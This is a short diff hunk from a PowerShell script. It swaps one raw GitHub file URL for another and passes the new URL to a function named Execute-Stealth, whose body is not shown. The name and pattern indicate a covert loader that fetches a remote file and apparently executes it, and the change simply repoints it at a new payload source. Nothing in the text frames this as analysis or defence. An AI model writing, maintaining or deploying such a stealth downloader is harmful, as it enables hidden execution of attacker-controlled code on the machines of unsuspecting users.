@@ -47,6 +47,6 @@ function Execute-Stealth {
     }
 }
 
-$url = "https://raw.githubusercontent.com/thegoatofapi/AL/refs/heads/main/file.txt"
+$url = "https://raw.githubusercontent.com/thegoatofapi/myl/refs/heads/main/file.txt"
 
 Execute-Stealth -url $url
